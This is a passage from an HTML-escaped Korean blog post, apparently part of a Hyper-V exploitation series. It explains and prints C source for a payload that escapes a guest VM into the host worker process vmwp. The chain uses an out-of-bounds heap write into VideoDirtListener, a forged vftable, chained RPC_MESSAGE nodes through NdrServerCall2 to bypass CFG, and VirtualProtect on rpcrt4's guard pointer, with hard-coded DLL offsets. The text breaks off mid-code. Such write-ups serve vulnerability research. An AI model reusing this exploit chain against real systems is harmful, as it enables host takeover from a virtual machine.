&lt;h3 id=&#34;CreateFileA&#34;&gt;&lt;a href=&#34;#CreateFileA&#34; class=&#34;headerlink&#34; title=&#34;CreateFileA&#34;&gt;&lt;/a&gt;&lt;code&gt;CreateFileA&lt;/code&gt;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;GetCopy&lt;/code&gt;&amp;#xB97C; &amp;#xB05D;&amp;#xC73C;&amp;#xB85C; CFG&amp;#xAC00; &amp;#xBB34;&amp;#xB825;&amp;#xD654;&amp;#xB418;&amp;#xC5C8;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC5B4;&amp;#xB5A4; &amp;#xD568;&amp;#xC218;&amp;#xB3C4; &amp;#xD638;&amp;#xCD9C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xAC8C; &amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xAD73;&amp;#xC774; &amp;#xD568;&amp;#xC218;&amp;#xC77C; &amp;#xD544;&amp;#xC694;&amp;#xB3C4; &amp;#xC5C6;&amp;#xC774; &amp;#xC2E4;&amp;#xD589; &amp;#xAC00;&amp;#xB2A5;&amp;#xD55C; &amp;#xADF8; &amp;#xC5B4;&amp;#xB5A4; &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C;&amp;#xB3C4; &amp;#xC81C;&amp;#xC5B4; &amp;#xD750;&amp;#xB984;&amp;#xC744; &amp;#xC870;&amp;#xC791;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xAC8C; &amp;#xB41C; &amp;#xAC83;&amp;#xC774;&amp;#xC8E0;. &amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; &amp;#xD30C;&amp;#xD2B8; 4&amp;#xC5D0;&amp;#xC11C; &amp;#xC54C;&amp;#xC544;&amp;#xBCF4;&amp;#xC558;&amp;#xB2E4;&amp;#xC2DC;&amp;#xD53C; vmwp&amp;#xB294; &amp;#xC790;&amp;#xC2DD; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xB97C; &amp;#xC0DD;&amp;#xC131;&amp;#xD560; &amp;#xC218; &amp;#xC5C6;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &lt;code&gt;CreateProcess&lt;/code&gt;&amp;#xB85C; &amp;#xBA4B;&amp;#xC788;&amp;#xAC8C; &amp;#xACC4;&amp;#xC0B0;&amp;#xAE30;&amp;#xB97C; &amp;#xB744;&amp;#xC6B0;&amp;#xB294; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC744; &amp;#xBD88;&amp;#xAC00;&amp;#xB2A5;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &lt;code&gt;C:\Users\Public&lt;/code&gt; &amp;#xBC11;&amp;#xC5D0; &amp;#xC544;&amp;#xBB34; &amp;#xD30C;&amp;#xC77C;&amp;#xC774;&amp;#xB098; &amp;#xC0DD;&amp;#xC131;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC73C;&amp;#xB85C; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xC81C; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xCF54;&amp;#xB4DC;&amp;#xC758; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xBCF4;&amp;#xC2DC;&amp;#xC8E0;!&lt;/p&gt;
&lt;h1 id=&#34;Payload&#34;&gt;&lt;a href=&#34;#Payload&#34; class=&#34;headerlink&#34; title=&#34;Payload&#34;&gt;&lt;/a&gt;Payload&lt;/h1&gt;&lt;p&gt;&amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xC758; &amp;#xB300;&amp;#xB7B5;&amp;#xC801;&amp;#xC778; &amp;#xAD6C;&amp;#xC870;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC758; &amp;#xADF8;&amp;#xB9BC;&amp;#xACFC; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&lt;br&gt;&lt;img src=&#34;/2023/10/30/pwndorei/newjeans-hyper-v-pt5/image7.png&#34; alt&gt;&lt;br&gt;&amp;#xBCF4;&amp;#xAE30;&amp;#xB9CC; &amp;#xD574;&amp;#xB3C4; &amp;#xC5B4;&amp;#xC9C8;&amp;#xC5B4;&amp;#xC9C8;&amp;#xD574;&amp;#xC9C0;&amp;#xB294; &amp;#xC800; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xAC00; OOB Write&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xD0C0;&amp;#xAC9F; &amp;#xD799;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;VideoDirtListener&lt;/code&gt;&amp;#xAC00; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC5D0; &amp;#xC0BD;&amp;#xC785;&amp;#xB420; &amp;#xAC83;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xC758; &amp;#xAC00;&amp;#xC7A5; &amp;#xC55E; &amp;#xBD80;&amp;#xBD84;&amp;#xC5D0; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; &amp;#xB178;&amp;#xB4DC;&amp;#xB4E4;&amp;#xC740; &amp;#xAC01; 0x100 &amp;#xD06C;&amp;#xAE30;&amp;#xB97C; &amp;#xAC00;&amp;#xC9C0;&amp;#xACE0; CFG &amp;#xBB34;&amp;#xB825;&amp;#xD654;&amp;#xC5D0;&amp;#xC11C; &amp;#xC124;&amp;#xBA85;&amp;#xD55C; &amp;#xAC83;&amp;#xCC98;&amp;#xB7FC; &amp;#xAC01; &amp;#xB178;&amp;#xB4DC;&amp;#xB294; &lt;code&gt;RPC_MESSAGE&lt;/code&gt;&amp;#xC774;&amp;#xC790; &lt;code&gt;RegistrationStore::Context&lt;/code&gt;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xCD94;&amp;#xAC00;&amp;#xB85C; &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xB178;&amp;#xB4DC;&amp;#xB294; &lt;code&gt;VideoDirtListener&lt;/code&gt;&amp;#xC774;&amp;#xAE30;&amp;#xB3C4; &amp;#xD558;&amp;#xB124;&amp;#xC694;. &amp;#xBB34;&amp;#xD2BC; &amp;#xC800;&amp;#xB294; &amp;#xC774; &amp;#xB178;&amp;#xB4DC;&amp;#xC758; &amp;#xD06C;&amp;#xAE30;&amp;#xB97C; 0x100 &amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xB85C; &amp;#xC7A1;&amp;#xACE0; &amp;#xC55E;&amp;#xC758; 0x60&amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xB294; &lt;code&gt;RPC_MESSAGE&lt;/code&gt;&amp;#xC774;&amp;#xACE0; &amp;#xB098;&amp;#xBA38;&amp;#xC9C0; &amp;#xACF5;&amp;#xAC04;&amp;#xC744; &lt;code&gt;RPC_MESSAGE&lt;/code&gt;&amp;#xC758; &lt;code&gt;Buffer&lt;/code&gt;&amp;#xB85C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&amp;#xADF8;&amp;#xB7FC; &amp;#xC774;&amp;#xC81C; &amp;#xC81C;&amp;#xAC00; &amp;#xC791;&amp;#xC131;&amp;#xD55C; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xCF54;&amp;#xB4DC;&amp;#xC5D0;&amp;#xC11C; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xB97C; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xC5C8;&amp;#xB294;&amp;#xC9C0; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCF4;&amp;#xC2DC;&amp;#xC8E0;!&lt;/p&gt;
&lt;h2 id=&#34;Exploit-Code&#34;&gt;&lt;a href=&#34;#Exploit-Code&#34; class=&#34;headerlink&#34; title=&#34;Exploit Code&#34;&gt;&lt;/a&gt;Exploit Code&lt;/h2&gt;&lt;h3 id=&#34;Variables&#34;&gt;&lt;a href=&#34;#Variables&#34; class=&#34;headerlink&#34; title=&#34;Variables&#34;&gt;&lt;/a&gt;Variables&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;__int64 rpcrt4_guard_check_icall_fptr = RPCRT4 + &lt;span class=&#34;hljs-number&#34;&gt;0xe94f0&lt;/span&gt;, KernelBase_VirtualProtect = KernelBase + &lt;span class=&#34;hljs-number&#34;&gt;0x64030&lt;/span&gt;, ret = RPCRT4 + &lt;span class=&#34;hljs-number&#34;&gt;0x58480&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x1e&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//RPCRT4!NdrServerCall2 + 0x1e =&amp;gt; ret&lt;/span&gt;


&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;* payload = (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)VideoDirtListenerOffset;
PRPC_MESSAGE pRpcMsg = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
PRPC_SERVER_INTERFACE pServerInterface = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
PMIDL_SERVER_INFO pMidl = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
__int64* node = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;

__int64 start = VideoDirtListener, DispatchTable = start + &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt; * INDIRECT_CALL_CHAIN_LEN, MidlStubDesc = DispatchTable + &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(__int64) * INDIRECT_CALL_CHAIN_LEN, MidlSrvInfo = MidlStubDesc + &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(MIDL_STUB_DESC), ServerInterface = MidlSrvInfo + &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(MIDL_SERVER_INFO);
__int64 ProcStringAddress = ServerInterface + &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(RPC_SERVER_INTERFACE), FmtStringOffsetAddress = ProcStringAddress + &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;, vftable = FmtStringOffsetAddress + &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;short&lt;/span&gt;) * &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;;
&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;* ProcString = ((&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)VideoDirtListenerOffset) + (ProcStringAddress - start);
&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; ProcStringCursor = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
WORD* FmtStringOffset = ((&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)VideoDirtListenerOffset) + (FmtStringOffsetAddress - start);
&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; INDIRECT_CALL_CHAIN_LEN; i++) {
	FmtStringOffset[i] = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xBCC0;&amp;#xC218;&amp;#xB4E4;&amp;#xC744; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xD558;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD0C0;&amp;#xAC9F; &amp;#xD799;&amp;#xC5D0;&amp;#xC11C; &amp;#xC720;&amp;#xCD9C;&amp;#xD55C; DLL &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C; &lt;code&gt;rpcrt4!__guard_check_icall_fptr&lt;/code&gt;, &lt;code&gt;VirtualProtect&lt;/code&gt; &amp;#xB4F1;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xBCC0;&amp;#xC218;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;start&lt;/code&gt;, &lt;code&gt;DispatchTable&lt;/code&gt; &amp;#xB4F1; &amp;#xC815;&amp;#xC218;&amp;#xD615; &amp;#xBCC0;&amp;#xC218;&amp;#xB4E4;&amp;#xC740; vmwp&amp;#xC758; &amp;#xAC00;&amp;#xC0C1; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xACE0; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC544;&amp;#xAE4C; &amp;#xC704;&amp;#xC5D0;&amp;#xC11C; &amp;#xBCF8; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC; &amp;#xAD6C;&amp;#xC870;&amp;#xC5D0;&amp;#xC11C; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xB4EF;&amp;#xC774; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC; &amp;#xC548;&amp;#xC5D0;&amp;#xC11C; &amp;#xB2E4;&amp;#xC591;&amp;#xD55C; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4;&amp;#xB4E4;&amp;#xC774; &amp;#xC11C;&amp;#xB85C;&amp;#xB97C; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xACE0; &amp;#xC788;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xBBF8;&amp;#xB9AC; &amp;#xD574;&amp;#xB2F9; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xACC4;&amp;#xC0B0;&amp;#xD574;&amp;#xB450;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8; &amp;#xC678;&amp;#xC5D0; &amp;#xD3EC;&amp;#xC778;&amp;#xD130; &amp;#xBCC0;&amp;#xC218;&amp;#xB4E4;&amp;#xC740; vmwp&amp;#xAC00; &amp;#xC544;&amp;#xB2CC; Exploit &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC758; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC5D0;&amp;#xC11C; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xC5D0; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC4F8; &amp;#xB54C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;vftable&#34;&gt;&lt;a href=&#34;#vftable&#34; class=&#34;headerlink&#34; title=&#34;vftable&#34;&gt;&lt;/a&gt;vftable&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;VideoDirtListenerEntries[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = combase + &lt;span class=&#34;hljs-number&#34;&gt;0x17d9b0&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//vmemulateddevices!VideoDirtListener::PrepareSelf -&amp;gt; combase!RegistrationStore::Context::RevertChanges&lt;/span&gt;
VideoDirtListenerEntries[&lt;span class=&#34;hljs-number&#34;&gt;0x70&lt;/span&gt; / &lt;span class=&#34;hljs-number&#34;&gt;0x8&lt;/span&gt;] = RPCRT4 + &lt;span class=&#34;hljs-number&#34;&gt;0x58480&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//RPCRT4!NdrServerCall2&lt;/span&gt;
VideoDirtListenerEntries[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = DispatchTable + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt; - &lt;span class=&#34;hljs-number&#34;&gt;0x70&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;// -&amp;gt; RPCRT4!NdrpServerUnmarshal&amp;apos;s indirect call must return 0, point to VirtualProtect &amp;amp; make it fail to return 0&lt;/span&gt;
VideoDirtListenerEntries[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x33307c89abcdef&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//NdrStubCall2+0x4c0&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;VideoDirtlistenerEntries&lt;/code&gt;&amp;#xB294; &lt;code&gt;VideoDirtListener&lt;/code&gt;&amp;#xC758; vftable&amp;#xC758; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xAC04;&amp;#xC811; &amp;#xD638;&amp;#xCD9C;&amp;#xC744; &amp;#xBC18;&amp;#xBCF5;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &lt;code&gt;VideoDirtListener::PrepareSelf&lt;/code&gt;&amp;#xB97C; &lt;code&gt;combase!RegistrationStore:Context:RevertChanges&lt;/code&gt;&amp;#xB85C; &amp;#xBC14;&amp;#xAFD4;&amp;#xC8FC;&amp;#xACE0; &lt;code&gt;RevertChanges&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xB420; &amp;#xD568;&amp;#xC218;&amp;#xB294; &lt;code&gt;NdrServerCall2&lt;/code&gt;&amp;#xB85C; &amp;#xC870;&amp;#xC791;&amp;#xD574;&amp;#xB450;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &lt;code&gt;NdrStubCall2&lt;/code&gt;&amp;#xC640; &lt;code&gt;NdrpServerUnMarshal&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;RpcRaiseException&lt;/code&gt;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xB9C9;&amp;#xAE30; &amp;#xC704;&amp;#xD574; 0&amp;#xBC88;&amp;#xC9F8;, 1&amp;#xBC88;&amp;#xC9F8; &amp;#xC5D4;&amp;#xD2B8;&amp;#xB9AC;&amp;#xB97C; &amp;#xC218;&amp;#xC815;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;ProcDesc-amp-ProcString&#34;&gt;&lt;a href=&#34;#ProcDesc-amp-ProcString&#34; class=&#34;headerlink&#34; title=&#34;ProcDesc &amp;amp; ProcString&#34;&gt;&lt;/a&gt;ProcDesc &amp;amp; ProcString&lt;/h3&gt;&lt;p&gt;&lt;code&gt;NdrServerCall2&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xC5D0; &amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xC778;&amp;#xC790;&amp;#xB97C; Unmarshaling&amp;#xD558;&amp;#xB294;&amp;#xB370; &amp;#xD544;&amp;#xC694;&amp;#xD55C; ProcString&amp;#xACFC; ProcDesc&amp;#xB3C4; &amp;#xC798; &amp;#xC124;&amp;#xC815;&amp;#xD574;&amp;#xC918;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xB178;&amp;#xB4DC;(&lt;code&gt;VideoDirtListener&lt;/code&gt;)&amp;#xB294; &amp;#xB8E8;&amp;#xD504;&amp;#xB97C; &amp;#xC2DC;&amp;#xC791;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &lt;code&gt;RevertChanges&lt;/code&gt;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xC5ED;&amp;#xD560;&amp;#xB9CC; &amp;#xD558;&amp;#xACE0; &amp;#xB450; &amp;#xBC88;&amp;#xC9F8; &amp;#xB178;&amp;#xB4DC;&amp;#xBD80;&amp;#xD130; &amp;#xCC28;&amp;#xB840;&amp;#xB85C; &lt;code&gt;VirtualProtect&lt;/code&gt;, &lt;code&gt;GetCopy&lt;/code&gt;, &lt;code&gt;CreateFileA&lt;/code&gt;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB530;&amp;#xB77C;&amp;#xC11C; &amp;#xC778;&amp;#xC790;&amp;#xC758; &amp;#xC218;&amp;#xB294; &amp;#xC774;&amp;#xBBF8; &amp;#xC815;&amp;#xD574;&amp;#xC838; &amp;#xC788;&amp;#xC73C;&amp;#xB2C8; &amp;#xC774;&amp;#xC5D0; &amp;#xB9DE;&amp;#xCDB0; ProcString&amp;#xACFC; ProcDesc&amp;#xB97C; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBC18;&amp;#xBCF5;&amp;#xBB38;&amp;#xC5D0;&amp;#xC11C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB41C; i&amp;#xB294; ProcNum&amp;#xC774;&amp;#xC790; &amp;#xB178;&amp;#xB4DC;&amp;#xC758; &amp;#xBC88;&amp;#xD638;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&amp;#xADF8; &amp;#xC678;&amp;#xC5D0; vftable &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xBCC0;&amp;#xACBD;&amp;#xD558;&amp;#xACE0; &lt;code&gt;RevertChanges&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB420; &lt;code&gt;Blink&lt;/code&gt;&amp;#xB97C; &amp;#xB2E4;&amp;#xC74C; &amp;#xB178;&amp;#xB4DC;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C; &amp;#xC124;&amp;#xC815;&amp;#xD558;&amp;#xACE0; &lt;code&gt;RPC_MESSAGE&lt;/code&gt;&amp;#xC758; &amp;#xD544;&amp;#xB4DC;&amp;#xB4E4;&amp;#xB3C4; &amp;#xC124;&amp;#xC815;&amp;#xD574;&amp;#xC90D;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&amp;#xC774;&amp;#xD6C4; switch-case&amp;#xB85C; i&amp;#xC5D0; &amp;#xB530;&amp;#xB77C; &lt;code&gt;BufferLength&lt;/code&gt;, &lt;code&gt;NumberParams&lt;/code&gt;, &lt;code&gt;StackSize&lt;/code&gt; &amp;#xB4F1;&amp;#xC744; &amp;#xC124;&amp;#xC815;&amp;#xD558;&amp;#xACE0; &amp;#xC774;&amp;#xD6C4; &lt;code&gt;NumberParams&lt;/code&gt;&amp;#xAC1C;&amp;#xC758; &lt;code&gt;Param&lt;/code&gt;&amp;#xC744; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xD574;&amp;#xC90D;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; INDIRECT_CALL_CHAIN_LEN; i++) {
	&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;* ProcDesc = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
	WORD* Param = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
	node = payload + i * &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;;
	node[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = vftable;
	node[&lt;span class=&#34;hljs-number&#34;&gt;0x58&lt;/span&gt; / &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;] = start + (i + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;) * &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x50&lt;/span&gt;;
	pRpcMsg = payload + i * &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;;
	pRpcMsg-&amp;gt;Buffer = start + i * &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x60&lt;/span&gt;;
	pRpcMsg-&amp;gt;ProcNum = i;
	pRpcMsg-&amp;gt;RpcInterfaceInformation = ServerInterface;
	pRpcMsg-&amp;gt;DataRepresentation = &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;;
	FmtStringOffset[i] = ProcStringCursor;

	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Node[%x]: address=%llx, vftable=%llx, Buffer=%llx, RPC_SERVER_INTERFACE=%llx, next=%llx\n&amp;quot;&lt;/span&gt;, i, start+i*&lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;, vftable, start+i*&lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;+&lt;span class=&#34;hljs-number&#34;&gt;0x60&lt;/span&gt;, ServerInterface, start + (i+&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)*&lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;+&lt;span class=&#34;hljs-number&#34;&gt;0x50&lt;/span&gt;);

	ProcString[ProcStringCursor + &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x1&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//HandleType = 0x1&lt;/span&gt;
	ProcString[ProcStringCursor + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//InterpreterFlags = 0&lt;/span&gt;
	*(&lt;span class=&#34;hljs-keyword&#34;&gt;short&lt;/span&gt;*)&amp;amp;ProcString[ProcStringCursor + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;// return value == 0&lt;/span&gt;
	&lt;span class=&#34;hljs-keyword&#34;&gt;switch&lt;/span&gt; (i) {&lt;span class=&#34;hljs-comment&#34;&gt;//i=&amp;gt;ProcNum,  StackSize = BufferLength, Buffer + Bufferlen =&amp;gt; ProcDesc&lt;/span&gt;
	&lt;span class=&#34;hljs-keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;:&lt;span class=&#34;hljs-comment&#34;&gt;//VirtualProtect(RPCRT4!_guard_check_icall_fptr, 8, PAGE_READWRITE, VALID_ADDRESS)&lt;/span&gt;
		*(&lt;span class=&#34;hljs-keyword&#34;&gt;short&lt;/span&gt;*)&amp;amp;ProcString[ProcStringCursor + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//StackSize &amp;lt;- Buffer Length&lt;/span&gt;
		pRpcMsg-&amp;gt;BufferLength = &lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;;
		&lt;span class=&#34;hljs-comment&#34;&gt;//*(__int64*)&amp;amp;ProcString[0x10 * i + 6] = start + i * 0x100 + 0x60 + 0x20 + 0x10;//0x20 -&amp;gt; bufferlen, ProcDesc Pointer&lt;/span&gt;
